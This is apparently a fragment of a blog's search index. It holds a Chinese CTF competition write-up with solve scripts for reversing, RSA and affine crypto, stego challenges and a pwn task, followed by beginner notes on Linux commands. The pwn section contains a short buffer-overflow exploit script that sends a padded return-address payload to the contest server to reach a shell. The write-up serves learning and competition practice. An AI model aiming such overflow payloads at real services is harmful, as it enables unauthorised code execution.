class=\"built_in\">ord</span>(key[i])+ <span class=\"number\">13</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (i &amp; <span class=\"number\">1</span> == <span class=\"number\">0</span>):</span><br><span class=\"line\">            flag= <span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(key[i]) - <span class=\"number\">3</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (i % <span class=\"number\">2</span> == <span class=\"number\">1</span>):</span><br><span class=\"line\">            flag = <span class=\"built_in\">chr</span>(<span class=\"built_in\">ord</span>(key[i]) + <span class=\"number\">5</span>)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\"><span class=\"comment\">#flag&#123;RrrrEe33202111&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>所以是flag{RrrrEe33202111}</p>\n<h6 id=\"ANDROID\"><a href=\"#ANDROID\" class=\"headerlink\" title=\"ANDROID\"></a>ANDROID</h6><p>简单的apk逆向，直接用jadx-dui打开查看mainactivity的代码：</p>\n<p>发现其是数组奇数位异或i，偶数位异或数组的i+1，那就先将奇数位求出，再算偶数位，py代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#iArr = [102, 13, 99, 28, 127, 55, 99, 19, 109, 1, 121, 58, 83, 30, 79, 0, 64, 42]</span></span><br><span class=\"line\">iArr2 = [<span class=\"number\">42</span>, <span class=\"number\">42</span>, <span class=\"number\">42</span>, <span class=\"number\">42</span>, <span class=\"number\">42</span>, <span class=\"number\">42</span>, <span class=\"number\">42</span>, <span class=\"number\">42</span>, <span class=\"number\">42</span>, <span class=\"number\">42</span>, <span class=\"number\">42</span>, <span class=\"number\">42</span>, <span class=\"number\">42</span>, <span class=\"number\">42</span>, <span class=\"number\">42</span>, <span class=\"number\">42</span>, <span class=\"number\">42</span>, <span class=\"number\">42</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;for i in range(17):</span></span><br><span class=\"line\"><span class=\"string\">    if(i%2==0):</span></span><br><span class=\"line\"><span class=\"string\">        print(iArr[i]^1)&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#得出奇数位代码</span></span><br><span class=\"line\">iArr = [<span class=\"number\">102</span>, <span class=\"number\">13</span>, <span class=\"number\">97</span>, <span class=\"number\">28</span>, <span class=\"number\">123</span>, <span class=\"number\">55</span>, <span class=\"number\">101</span>, <span class=\"number\">19</span>, <span class=\"number\">101</span>, <span class=\"number\">1</span>, <span class=\"number\">115</span>, <span class=\"number\">58</span>, <span class=\"number\">95</span>, <span class=\"number\">30</span>, <span class=\"number\">65</span>, <span class=\"number\">0</span>, <span class=\"number\">80</span>, <span class=\"number\">42</span>] <span class=\"comment\">#得出奇数位代码后的数组</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;102,97,123,101,101,115,95,65,80&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;for i in range(17):</span></span><br><span class=\"line\"><span class=\"string\">    if(i%2==0):</span></span><br><span class=\"line\"><span class=\"string\">        print(iArr[i]^i)&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">17</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(i%<span class=\"number\">2</span>!=<span class=\"number\">0</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"built_in\">chr</span>(iArr[i]^iArr[i+<span class=\"number\">1</span>]))</span><br><span class=\"line\"><span class=\"comment\">#得出偶数位代码</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;fa&#123;ees_AP&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;lgRvre_P&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#奇数和偶数一个一个的叠加可得flag&#123;Reverse__APP&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>所以是flag{Reverse__APP}</p>\n<h6 id=\"WAY\"><a href=\"#WAY\" class=\"headerlink\" title=\"WAY\"></a>WAY</h6><p>1.查壳发现有upx壳，工具脱壳。</p>\n<p>2.这是一个迷宫题，找到迷宫，ida看到数组中5数字，猜测应该是5个一排，碰到I结束，一直到#结束，所以迷宫如下</p>\n<p>OIIII<br>OOIO#<br>IOOOI<br>IOIOI<br>IIIII</p>\n<p>3.这样就可以得到路径sdsddwd，py代码计算md5（注意flag是小写的）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\">m = hashlib.md5()</span><br><span class=\"line\">m.update(<span class=\"string\">b&#x27;sdsddwd&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(m.hexdigest())</span><br><span class=\"line\"><span class=\"comment\">#flag&#123;6654b3343f6f3f6223a721e7f65e87f8&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>所以是flag{6654b3343f6f3f6223a721e7f65e87f8}</p>\n<h5 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h5><h6 id=\"Easy-SignIn\"><a href=\"#Easy-SignIn\" class=\"headerlink\" title=\"Easy SignIn\"></a>Easy SignIn</h6><p>16进制转字符串，再base64解密，再base32解密，再base64可以得到flag{welc0me_to_my_s1gn_in}</p>\n<h6 id=\"RSA\"><a href=\"#RSA\" class=\"headerlink\" title=\"RSA\"></a>RSA</h6><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">n = <span class=\"number\">124689085077258164778068312042204623310499608479147230303784397390856552161216990480107601962337145795119702418941037207945225700624828698479201514402813520803268719496873756273737647275368178642547598433774089054609501123610487077356730853761096023439196090013976096800895454898815912067003882684415072791099101814292771752156182321690149765427100411447372302757213912836177392734921107826800451961356476403676537015635891993914259330805894806434804806828557650766890307484102711899388691574351557274537187289663586196658616258334182287445283333526057708831147791957688395960485045995002948607600604406559062549703501</span></span><br><span class=\"line\">t = <span class=\"number\">10</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(-<span class=\"number\">1000000</span>, <span class=\"number\">1000000</span>):</span><br><span class=\"line\">    x = gmpy2.iroot(k ** <span class=\"number\">2</span> + <span class=\"number\">4</span> * t * n, <span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> x[<span class=\"number\">1</span>]:</span><br><span class=\"line\">        p = (-k + x[<span class=\"number\">0</span>]) // (<span class=\"number\">2</span> * t)</span><br><span class=\"line\">        q = t * p + k</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes, bytes_to_long</span><br><span class=\"line\"></span><br><span class=\"line\">phi = (p - <span class=\"number\">1</span>) * (q - <span class=\"number\">1</span>)</span><br><span class=\"line\">e = <span class=\"number\">57742</span></span><br><span class=\"line\">c = <span class=\"number\">57089349656454488535971268237112640808678921972499308620061475860564979797594115551952530069277022452969364212192304983697546604832633827546853055947447207342333989645243311993521374600648715233552522771885346402556591382705491510591127114201773297304492218255645659953740107015305266722841039559992219190665868501327315897172069355950699626976019934375536881746570219967192821765127789432830133383612341872295059056728626931869442945556678768428472037944494803103784312535269518166034046358978206653136483059224165128902173951760232760915861623138593103016278906012134142386906130217967052002870735327582045390117565</span></span><br><span class=\"line\"></span><br><span class=\"line\">t = gmpy2.gcd(e, phi)</span><br><span class=\"line\">d = gmpy2.invert(e // t, phi)</span><br><span class=\"line\">m = <span class=\"built_in\">pow</span>(c, d, n)</span><br><span class=\"line\">msg = gmpy2.iroot(m, t)</span><br><span class=\"line\"><span class=\"keyword\">if</span> msg[<span class=\"number\">1</span>]:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(long_to_bytes(msg[<span class=\"number\">0</span>]))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># flag&#123;6d22773623d3d5c871692e9985de5f16&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>根据py代码可以得到以上脚本。</p>\n<h6 id=\"AFFINE\"><a href=\"#AFFINE\" class=\"headerlink\" title=\"AFFINE\"></a>AFFINE</h6><p>解密算法：m = a^-1(m - b) (mod n)（注：a^用_a表示）</p>\n<p>仿射密码解密：爆破a：0-50，b：0-50，因为asert说明爆破出来的需要有flag。最终得到a=44,b=17,明文:’Oh62Affine1sSti1lN0tSecureEnoughToProtectflag，再算其md5，可得flag。代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\"></span><br><span class=\"line\">letter=string.ascii_letters+string.digits</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;def encrypt(m, c, a, b):</span></span><br><span class=\"line\"><span class=\"string\">    for i in range(len(m)):</span></span><br><span class=\"line\"><span class=\"string\">        ch=m[i]</span></span><br><span class=\"line\"><span class=\"string\">        t=(letter.index(ch) * a + b) % 62</span></span><br><span class=\"line\"><span class=\"string\">        c.append(letter[t])</span></span><br><span class=\"line\"><span class=\"string\">    d = &#x27;&#x27;.join(c)</span></span><br><span class=\"line\"><span class=\"string\">    print(d)&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decrypt</span>(<span class=\"params\">m, c, a, b</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(m)):</span><br><span class=\"line\">        ch=m[i]</span><br><span class=\"line\">        t=((letter.index(ch)-b) * (a^-<span class=\"number\">1</span>)) % <span class=\"number\">62</span></span><br><span class=\"line\">        c.append(letter[t])</span><br><span class=\"line\">    d = <span class=\"string\">&#x27;&#x27;</span>.join(c)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> d</span><br><span class=\"line\"></span><br><span class=\"line\">m=<span class=\"string\">&quot;xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv&quot;</span></span><br><span class=\"line\">c = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> a <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">50</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> b <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>,<span class=\"number\">50</span>):</span><br><span class=\"line\">        m = <span class=\"string\">&quot;xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv&quot;</span></span><br><span class=\"line\">        c=[]</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"string\">&quot;flag&quot;</span> <span class=\"keyword\">in</span> decrypt(m,c,a,b)):</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(decrypt(m,c,a,b),a,b)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;print(&quot;加密后的密文为：&quot;)</span></span><br><span class=\"line\"><span class=\"string\">Cipher = encrypt(m, c, a, b)</span></span><br><span class=\"line\"><span class=\"string\">flag = hashlib.md5(&quot;&quot;.join(str(m)).encode(&quot;utf8&quot;)).hexdigest()&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#print(flag)</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">加密后的密文为：</span></span><br><span class=\"line\"><span class=\"string\">xGJ13kkRK9QDfORQomFOf9NZs9LKVZvGqVIsVO9NOkorv</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#Oh62Affine1sSti1lN0tSecureEnoughToProtectflagOh62Affine1sSti1lN0tSecureEnoughToProtectflag 44 17</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> hashlib</span><br><span class=\"line\">m = hashlib.md5()</span><br><span class=\"line\">m.update(<span class=\"string\">b&#x27;Oh62Affine1sSti1lN0tSecureEnoughToProtectflag&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(m.hexdigest())</span><br><span class=\"line\"><span class=\"comment\">#flag&#123;2b9b99caae1cc49e5b5aacbc8cc22350&#125;</span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h5><h6 id=\"Sign-in\"><a href=\"#Sign-in\" class=\"headerlink\" title=\"Sign-in\"></a>Sign-in</h6><p>关注公共号发消息可得flag。</p>\n<h6 id=\"DORAEMON\"><a href=\"#DORAEMON\" class=\"headerlink\" title=\"DORAEMON\"></a>DORAEMON</h6><p>1.暴力破解zip文件密码可以得到密码376852</p>\n<p>2.解压并打开图片，用010将图片高度改为600，可以看到一个二维码，补全定位符，扫描可得flag</p>\n<p><img src=\"/2022/02/25/HSC-1th/image-20220219180611781.png\" alt=\"image-20220219180611781\"></p>\n<p>flag{sing1emak3r10v3m!sc}</p>\n<h5 id=\"Pwn\"><a href=\"#Pwn\" class=\"headerlink\" title=\"Pwn\"></a>Pwn</h5><h6 id=\"Ez-pwn\"><a href=\"#Ez-pwn\" class=\"headerlink\" title=\"Ez_pwn\"></a>Ez_pwn</h6><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">sh = remote(<span class=\"string\">&quot;hsc2019.site&quot;</span>,<span class=\"number\">10234</span>)</span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">72</span>+<span class=\"string\">&#x27;\\x45\\x07\\x40\\x00\\x00\\x00\\x00\\x00&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(payload)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>运行输入aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaE\u0007@   </p>\n<p>可以得到执行后门权限，直接cat /flag,得到flag{b512e43b-3770-4553-8849-49512f5d0ce2}</p>\n<h4 id=\"以此为分割线，以上是自己做出的，以下是复现的。\"><a href=\"#以此为分割线，以上是自己做出的，以下是复现的。\" class=\"headerlink\" title=\"以此为分割线，以上是自己做出的，以下是复现的。\"></a>以此为分割线，以上是自己做出的，以下是复现的。</h4><h5 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h5><h6 id=\"汝闻-人言否\"><a href=\"#汝闻-人言否\" class=\"headerlink\" title=\"汝闻,人言否\"></a>汝闻,人言否</h6><p>1.下载解压，得到图片，010打开，文件尾有KP开头，修改，图片的尾部也有KP开头，将其修改，修改完后提取为.zip，并用工具修复一下，可以得到压缩包，发现图片尾部有qazsedcftrfvgycft6yhntgbnytfvbhyik,.;p发现是键盘密码，得到WVALOU，A不好得到可用掩码爆破，掩码处填写WVA?LOU</p>\n<p>2.得到压缩包内容，发现是RIFF开头的，修改为.wav，弄为频谱图可以得到flag：</p>\n<p>flag{e5353bb7b57578bd4da1c898a8e2d767}</p>\n<h6 id=\"PERFORMANCE-ART\"><a href=\"#PERFORMANCE-ART\" class=\"headerlink\" title=\"PERFORMANCE-ART\"></a>PERFORMANCE-ART</h6><p>标准银河字母</p>\n<p>打开图片发现是银河密码，对照着手动解一下，其他的看着像是数字将所有的一个个翻译一<br>遍得到（图片上有的看像是数字，直接翻译为数字）</p>\n<p>可以得到：</p>\n<p>50 4B 03 04 14 00 00 00 08 00 4A 7E 72 53 14 8E<br>1E 1E 16 00 00 00 14 00 00 00 06 00 00 00 75 6E<br>6B 6E 6F 77 8B CA AD C8 88 32 2E C9 F3 0B 75 2D<br>F7 0C CF AE 8C CA 72 B3 04 00 50 4B 01 02 00 00<br>14 00 00 00 08 00 4A 7E 72 53 14 8E 1E 1E 16 00<br>00 00 14 00 00 00 06 00 00 00 00 00 00 00 00 00<br>00 00 00 00 00 00 00 00 75 6E 6B 6E 6F 77 50 4B<br>05 06 00 00 00 00 01 00 01 00 34 00 00 00 3A 00<br>00 00 00 00</p>\n<p>修改为.zip文件，解压可得flag</p>\n<h5 id><a href=\"#\" class=\"headerlink\" title></a><img src=\"/2022/02/25/HSC-1th/eac4b74543a98226aab284e78a82b9014b90ebfb.png\" alt=\"eac4b74543a98226aab284e78a82b9014b90ebfb\"></h5><h6 id=\"WIRESHARK\"><a href=\"#WIRESHARK\" class=\"headerlink\" title=\"WIRESHARK\"></a>WIRESHARK</h6><p>1.用foremost分离得到png和zip文件。</p>\n<p>2.<img src=\"/2022/02/25/HSC-1th/image-20220225101601822.png\" alt=\"image-20220225101601822\"></p>\n<p>LSB隐写，用save bin得到png图片，扫描发现wrsak..iehr370，栅栏密码2，得到zip密码wireshark3.7.0，解压zip文件（zip文件要修复一下）。打开文件发现文件尾部是%%EOF，所以是pdf文件，修改文件头255044462D312E，得到pdf文件，用wbstego4.3open软件decode得到flag{Go0dJ0B_y0ufIndLt}</p>\n","categories":["ctf比赛"],"tags":["48小时题目难度中等的比赛"]},{"title":"Linux基本操作命令","url":"/2022/04/13/Linux%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4/","content":"<p>此笔记为记录一下学习的内容</p>\n<span id=\"more\"></span>\n\n<h4 id=\"一：curl操作\"><a href=\"#一：curl操作\" class=\"headerlink\" title=\"一：curl操作\"></a>一：curl操作</h4><h5 id=\"1-利用curl直接访问指定的url，默认是Get方法，并显示响应报文。\"><a href=\"#1-利用curl直接访问指定的url，默认是Get方法，并显示响应报文。\" class=\"headerlink\" title=\"1.利用curl直接访问指定的url，默认是Get方法，并显示响应报文。\"></a>1.利用curl直接访问指定的url，默认是Get方法，并显示响应报文。</h5><h6 id=\"curl-http-127-0-0-1\"><a href=\"#curl-http-127-0-0-1\" class=\"headerlink\" title=\"curl http://127.0.0.1\"></a>curl <a href=\"http://127.0.0.1/\">http://127.0.0.1</a></h6><p>加上-v，可以显示详细信息：请求头，响应头，响应报文。</p>\n<p>加上-I，可以只显示响应头。</p>\n<p>–help帮助信息。</p>\n<h5 id=\"2-利用-X-POST\"><a href=\"#2-利用-X-POST\" class=\"headerlink\" title=\"2.利用-X POST\"></a>2.利用-X POST</h5><p>可以访问post请求，-d “what=flag”可以加参数。</p>\n<h5 id=\"3-H-“x-forwarded-for-1-1-1-1”\"><a href=\"#3-H-“x-forwarded-for-1-1-1-1”\" class=\"headerlink\" title=\"3.-H “x-forwarded-for:1.1.1.1”\"></a>3.-H “x-forwarded-for:1.1.1.1”</h5><p>增加请求头。-s静默模式。</p>\n<h5 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h5><p>echo $flag1 | base64 -d 2&gt; /dev/null | awk ‘{print $s2}’</p>\n<p>echo $flag1 | base64 -d 2&gt; /dev/null | cut -d”:” -f2</p>\n<h4 id=\"二：pwd-ls-cd\"><a href=\"#二：pwd-ls-cd\" class=\"headerlink\" title=\"二：pwd ls cd\"></a>二：pwd ls cd</h4><h5 id=\"pwd：print-working-directory-ls：list-cd：change-directory\"><a href=\"#pwd：print-working-directory-ls：list-cd：change-directory\" class=\"headerlink\" title=\"pwd：print working directory ls：list cd：change directory\"></a>pwd：print working directory ls：list cd：change directory</h5><p>打印当前工作目录以及列表以及更改目录（cd .. 返回上一级目录）</p>\n<p>补充：有一次把三条命令才能干完的事情，提升为一条命令完成。直接在<code>cd</code>命令后空格，然后加上你要去往的<code>绝对路径</code>的<code>/usr/bin</code>就可以。 当然，你也可以是用相对当前位置的<code>相对路径</code>的写法<code>./../usr/bin</code></p>\n<p>补充：ls -l（long）详细信息 -h（human）人性化显示</p>\n<p><strong>注意 可以用man 命令方式查看书册。</strong></p>\n<h4 id=\"三：文件管理\"><a href=\"#三：文件管理\" class=\"headerlink\" title=\"三：文件管理\"></a>三：文件管理</h4><h5 id=\"touch-file-创建空文件，echo-Hello-World-gt-hello-txt-向文件中输入内容echo-e让-n换行符生效-，cat-file-查看文件内容-cat-b-显示行号。\"><a href=\"#touch-file-创建空文件，echo-Hello-World-gt-hello-txt-向文件中输入内容echo-e让-n换行符生效-，cat-file-查看文件内容-cat-b-显示行号。\" class=\"headerlink\" title=\"touch file 创建空文件，echo Hello World &gt; hello.txt 向文件中输入内容echo -e让\\n换行符生效 ，cat file 查看文件内容 cat -b 显示行号。\"></a>touch file 创建空文件，echo Hello World &gt; hello.txt 向文件中输入内容echo -e让\\n换行符生效 ，cat file 查看文件内容 cat -b 显示行号。</h5><p>注意 &gt;覆盖文件而&gt;&gt;是追加文件。</p>\n<h5 id=\"mv-move-mv-old-file-name-new-file-name-重命名文件\"><a href=\"#mv-move-mv-old-file-name-new-file-name-重命名文件\" class=\"headerlink\" title=\"mv:move mv old_file_name new_file_name 重命名文件\"></a>mv:move mv old_file_name new_file_name 重命名文件</h5><h5 id=\"rm：remove-directory-entries-删除命令，rm-rf-全部删除rm-txt-匹配删除\"><a href=\"#rm：remove-directory-entries-删除命令，rm-rf-全部删除rm-txt-匹配删除\" class=\"headerlink\" title=\"rm：remove directory entries 删除命令，rm-rf 全部删除rm *.txt 匹配删除\"></a>rm：remove directory entries 删除命令，rm-rf 全部删除rm *.txt 匹配删除</h5><h5 id=\"mkdir-name，rmdir-name-对目录操作-mkdir-p-递归方式创建目录\"><a href=\"#mkdir-name，rmdir-name-对目录操作-mkdir-p-递归方式创建目录\" class=\"headerlink\" title=\"mkdir name，rmdir name 对目录操作  mkdir -p 递归方式创建目录\"></a>mkdir name，rmdir name 对目录操作  mkdir -p 递归方式创建目录</h5><h4 id=\"四：搜索定位文件\"><a href=\"#四：搜索定位文件\" class=\"headerlink\" title=\"四：搜索定位文件\"></a>四：搜索定位文件</h4><h5 id=\"find-search-path-name-filename查找文件名\"><a href=\"#find-search-path-name-filename查找文件名\" class=\"headerlink\" title=\"find search_path -name filename查找文件名\"></a>find search_path -name filename查找文件名</h5><table>\n<thead>\n<tr>\n<th align=\"left\">find命令的参数</th>\n<th align=\"left\">含义</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">-type</td>\n<td align=\"left\">指定搜索的文件类型：<code>d</code>目录文件，<code>b</code>块设备，<code>c</code>字符设备，<code>l</code>符号链接</td>\n</tr>\n<tr>\n<td align=\"left\">-size</td>\n<td align=\"left\">指定文件大小：n(单位k</td>\n</tr>\n<tr>\n<td align=\"left\">-empty</td>\n<td align=\"left\">只搜索空的文件或空目录</td>\n</tr>\n<tr>\n<td align=\"left\">-ctime</td>\n<td align=\"left\">指定搜索创建时间在n小时前创建的文件</td>\n</tr>\n</tbody></table>\n<p>示例find . -name a*</p>\n<h5 id=\"grep-文件内容搜索显示一行-grep-patterns-file\"><a href=\"#grep-文件内容搜索显示一行-grep-patterns-file\" class=\"headerlink\" title=\"grep 文件内容搜索显示一行 grep patterns file\"></a>grep 文件内容搜索显示一行 grep patterns file</h5><p>示例grep a test.txt</p>\n<h5 id=\"head和tail分别查找文件头部和尾部\"><a href=\"#head和tail分别查找文件头部和尾部\" class=\"headerlink\" title=\"head和tail分别查找文件头部和尾部\"></a>head和tail分别查找文件头部和尾部</h5><p>示例 head -n 5 text.txt, tail -n 5 test.txt 查看前5行和后5行。</p>\n<h5 id=\"diff比较文件差异-diff-filea-fileb-–color-彩色显示模式\"><a href=\"#diff比较文件差异-diff-filea-fileb-–color-彩色显示模式\" class=\"headerlink\" title=\"diff比较文件差异 diff filea fileb –color 彩色显示模式\"></a>diff比较文件差异 diff filea fileb –color 彩色显示模式</h5><p>示例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">/home# diff --color a.txt b.txt</span><br><span class=\"line\">1,3c1,2</span><br><span class=\"line\">&lt; Hello World</span><br><span class=\"line\">&lt; ABCDEFG</span><br><span class=\"line\">&lt; hello</span><br><span class=\"line\">---</span><br><span class=\"line\">&gt; hello WORLD</span><br><span class=\"line\">&gt; abcDEF</span><br><span class=\"line\">5d3</span><br><span class=\"line\">&lt; 1111</span><br><span class=\"line\">6a5</span><br><span class=\"line\">&gt; aaaa</span><br></pre></td></tr></table></figure>\n\n<p>1,3c1,2比对的第一行在字母c的左右两侧的数字分别表示前后两个比较文件的对应行。左侧的<code>1,3</code>表示<code>a.txt</code>文件的<code>1-3行</code>，<code>c</code>右侧的<code>1,2</code>表示<code>b.txt</code>文件的<code>1,2两行</code>中间的<code>c</code>表示<code>change</code>，也就是<code>a.txt</code>的前三行内容<code>变化</code>为<code>b.txt</code>的前两行内容。接下来的几行内容展示的就是前后变化。</p>\n<p><code>&lt;</code>开头的行表示左侧的<code>a.txt</code>文件内容，<code>&gt;</code>开头的行表示右侧的<code>b.txt</code>文件内容。<code>---</code>为前后分界线。</p>\n<blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt; Hello World</span><br><span class=\"line\">&lt; ABCDEFG</span><br><span class=\"line\">&lt; hello</span><br><span class=\"line\">---</span><br><span class=\"line\">hello WORLD</span><br><span class=\"line\">abcDEF</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p>中间的字母除了c(change改变)，还有a(append增加)和d(delete删除)。5d3表示啊。txt中的第5行到b.xt文件中第3行的位置被删除了。所以这次只有左侧的<code>1111</code>，右侧此行内容被删除了。6a5表示a.txt的第6行增加a(append)了一行内容，增加的内容为b.txt中的第5行所以这次只有右侧有aaaa，为新增内容。**-y以左右两列方式显示差异**。</p>\n<h4 id=\"四：zip-amp-unzip命令\"><a href=\"#四：zip-amp-unzip命令\" class=\"headerlink\" title=\"四：zip&amp;unzip命令\"></a>四：zip&amp;unzip命令</h4><h5 id=\"zip-archive-inpath-inpath-s-64k-分卷大小64k，zip-big-ziph-–out-new-zip-s-1m-大压缩包重新分卷\"><a href=\"#zip-archive-inpath-inpath-s-64k-分卷大小64k，zip-big-ziph-–out-new-zip-s-1m-大压缩包重新分卷\" class=\"headerlink\" title=\"zip archive inpath inpath -s 64k 分卷大小64k，zip big.ziph –out new.zip -s 1m 大压缩包重新分卷\"></a>zip archive inpath inpath -s 64k 分卷大小64k，zip big.ziph –out new.zip -s 1m 大压缩包重新分卷</h5><table>\n<thead>\n<tr>\n<th align=\"left\">参数</th>\n<th align=\"left\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">-r</td>\n<td align=\"left\">递归遍历目录</td>\n</tr>\n<tr>\n<td align=\"left\">-q</td>\n<td align=\"left\">不显示压缩命令的执行过程（q为quite缩写，安静模式）</td>\n</tr>\n<tr>\n<td align=\"left\">-d</td>\n<td align=\"left\">删除压缩包中指定文件</td>\n</tr>\n</tbody></table>\n<p>不使用<code>-r</code>参数，压缩遇到目录，只会添加目录路径本身，不会遍历目录内其他文件。</p>\n<p>示例 zip -d backup2.zip  test/abc.txt</p>\n<h5 id=\"unzip-file-d-exdirfile要解压缩的文件路径-d-exdir指定要解压缩的路径，其中exdir为解压缩后的文件路径\"><a href=\"#unzip-file-d-exdirfile要解压缩的文件路径-d-exdir指定要解压缩的路径，其中exdir为解压缩后的文件路径\" class=\"headerlink\" title=\"unzip file -d exdirfile要解压缩的文件路径-d exdir指定要解压缩的路径，其中exdir为解压缩后的文件路径\"></a>unzip file -d exdir<code>file</code>要解压缩的文件路径<code>-d exdir</code>指定要解压缩的路径，其中<code>exdir</code>为解压缩后的文件路径</h5><p>示例将<code>backup.zip</code>文件解压到<code>/home/abc</code>目录下</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">unzip backup.zip -d /home/abc</span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th align=\"left\">参数</th>\n<th align=\"left\">说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">-v</td>\n<td align=\"left\">查看压缩包内容</td>\n</tr>\n<tr>\n<td align=\"left\">-d</td>\n<td align=\"left\">指定解压缩路径</td>\n</tr>\n</tbody></table>\n<h4 id=\"五：gzip-amp-tar命令\"><a href=\"#五：gzip-amp-tar命令\" class=\"headerlink\" title=\"五：gzip&amp;tar命令\"></a>五：gzip&amp;tar命令</h4><table>\n<thead>\n<tr>\n<th align=\"left\">参数</th>\n<th 